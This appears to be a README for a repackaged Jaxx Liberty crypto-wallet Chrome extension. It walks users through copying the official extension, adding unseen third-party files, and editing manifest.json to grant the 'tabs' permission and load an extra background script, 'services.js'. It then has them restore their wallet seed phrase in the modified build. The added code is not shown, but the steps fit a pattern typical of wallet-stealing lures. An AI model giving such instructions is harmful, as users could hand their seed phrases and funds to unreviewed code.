# For who love jaxx.io

## Features
- The Jaxx Liberty for Desktop is more than 100Mb. This library can do it with **~4KB**... better performance.

## Important
- **Backup your wallet, phrase information before doing anything next.**
- To avoid all of allegations relate to the privacy in futures, you must to build this app by yourself, please understand that because your crypto wallet safety. Don't wories, it's easy. You even don't need any developer skill to build this app with my library, but please consult with your trusted technical representative for helpful advice.
- I cannot ensure or warrant the security of this scripts, so use at your own risk. I'm not responsible for anything that happens due to you using this script!


<p align="center"><img src="https://i.imgur.com/80psMJQ.png"></p>

## Let build it.
#### (*) You must install the [official Jaxx Liberty extension on chrome webstore](https://chrome.google.com/webstore/detail/jaxx-liberty/cjelfplplebdjjenllpjcblmjkfcffne) first
##### - If you seen "unzip error" and it can't download able, you can try some tips (use at your own risk): Visit crxdown.com or crxextractor.com, etc. Then paste chrome webstore url to download crx. After download crx, visit crxextractor.com, and upload that crx file to extract and convert .crx to .zip file, just skip step's one, once you've done this.
##### - English isn't my first language, im working on improving.... so please excuse any mistakes in this post..
<ol>
  <li>Access <code>chrome://version/</code> and get your <u>Profile Path</u>, if you use Chrome, it's looklike <code>...\Google\Chrome\User Data\Default\</code> , now you access folder <code>Extensions\cjelfplplebdjjenllpjcblmjkfcffne</code> inside your <u>Profile Path</u>.<br><br>
 <ul>
   <li><b>Tips <a href="https://i.imgur.com/mXkg687.png" tagert="_blank">[?]</a>:</b>
      <br><b>CentBrowser</b>: <small><code>%AppData%\..\Local\CentBrowser\User Data\Default\Extensions\cjelfplplebdjjenllpjcblmjkfcffne</code></small>
     <br><b>Google Chrome</b>: <small><code>%AppData%\..\Local\Google\Chrome\User Data\Default\Extensions\cjelfplplebdjjenllpjcblmjkfcffne</code></small>
      <br><b>CocCoc Browser</b>: <small><code>%AppData%\..\Local\CocCoc\Browser\User Data\Default\Extensions\cjelfplplebdjjenllpjcblmjkfcffne</code></small>
      <br><b>Edge Browser</b>: <small><code>%AppData%\..\Local\Microsoft\Edge\User Data\Default\Extensions\cjelfplplebdjjenllpjcblmjkfcffne</code></small><br><br>
      </li>
</ul></li>
  <li>If you installed latest Jaxx version, that folder is <code>2.4.6.0_0</code>just make a copy of that folder to another location, e.g <code>C:\2.4.6.0_0</code>, we will build the app here.</li>
  <li>Download <a  tagert="_blank" href="https://github.com/Brahmulr/jaxx.io-smApp/releases/latest">latest releases</a> library, unzip and move these files to <code>C:\2.4.6.0_0\</code></li>
</ol>


### Now we need edit, you can use notepad or any text-editor.
- Please careful with commas (`,`) and line break.

##### C:\2.4.6.0_0\manifest.json

Change `"default_popup": "index.html"` =>  `"default_popup": "pop.html"`

Change `"permissions": [` =>  `"permissions": ["tabs",`

Change `"background.js",` =>  `"background.js","services.js",`

After edited, `manifest.json` looklike <a  tagert="_blank" href="https://i.imgur.com/qdgSDRp.png">this image</a>

Save it.


##### C:\2.4.6.0_0\index.html
Change `</head>` =>  `<link rel="stylesheet" href="mod_themes.css"></head>`

After edited, `index.html` looklike <a  tagert="_blank" href="https://i.imgur.com/FEpFBhA.png">this image</a>

Save it.

## You've done! Let install new app.
- If you like this project, fell free to use, [give me a star](https://github.com/Brahmulr/jaxx.io-smApp/stargazers), or donate for me via ethereum : `0x9Fc6c9554B2eC78b55bfAc4A23240318f06614af` ♥️
### Open chrome, then access `chrome://extensions/` URL

<p align="center"><img src="https://i.imgur.com/bo64nXe.png"></p>

### You can now click on the icon of Jaxx Liberty extension to use, let start to recover that your backed-up's wallet - phrase

<p align="center"><img src="https://i.imgur.com/fnjXzMc.png"></p>
___________________________

## Create desktop shotcut (optional)
<h4> You must find the id of your jaxx app. Run that app, focus on the Jaxx tab, press F12 on your keybroard, in console, type <code>window.location.host</code> hit enter and copy the id. <a href="https://i.imgur.com/9kQDKEe.png"> see img</a>.<br>The id don't have quotation mark, in my case is <a href="https://i.imgur.com/9kQDKEe.png"> see img</a> <code>blhcioningpnkbaibljikmfbckhldeko</code>.</h4>

<ul>
  <li>Right click on your desktop, select to create shortcut.<br><br>
 <ul>
   <li><b>Location address of shortcut, replace <code>YOUR_APP_ID</code> with your app id.</b>
      <br><b>CentBrowser</b>: <small><code>%AppData%\..\Local\CentBrowser\Application\chrome_proxy.exe --app=chrome-extension://YOUR_APP_ID/pop.html</code></small><br>
     <br><b>Google Chrome</b>: <small><code>%AppData%\..\Local\Google\Chrome\Application\chrome_proxy.exe --app=chrome-extension://YOUR_APP_ID/pop.html</code></small><br>
      <br><b>CocCoc Browser</b>: <small><code>%AppData%\..\Local\CocCoc\Browser\Application\browser_proxy.exe --app=chrome-extension://YOUR_APP_ID/pop.html</code></small><br>
      <br><b>Edge Browser</b>: <small><code>%programfiles(x86)%\Microsoft\Edge\Application\msedge_proxy.exe --app=chrome-extension://YOUR_APP_ID/pop.html</code></small> <br><br>or <small><code>%programfiles%\Microsoft\Edge\Application\msedge_proxy.exe --app=chrome-extension://YOUR_APP_ID/pop.html</code></small><br><br>
      </li>
</ul></li>
</ul>

<h4> After shortcut created, right-click on that shourtcut, choose Run "Minimized" <a href="https://i.imgur.com/mJeHSAm.png"> see img</a></h4>

#### You can also change icon, the jaxx icon located at <code>C:\2.4.6.0_0\favicon.ico</code> then restart your browser to take effect, type <code>chrome://restart</code> on addresss bar, hit enter and try to runing desktop version ^^~


## END.


